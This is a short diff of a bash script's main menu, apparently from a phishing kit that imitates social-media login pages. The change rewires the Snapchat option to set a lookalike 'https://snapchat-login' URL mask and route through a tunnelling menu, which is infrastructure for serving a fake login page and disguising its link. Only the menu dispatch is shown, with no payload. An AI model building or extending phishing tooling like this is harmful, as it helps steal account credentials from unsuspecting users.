@@ -351,7 +351,9 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		site_sc
+		website="sc"
+		mask='https://snapchat-login'
+		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		site_instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
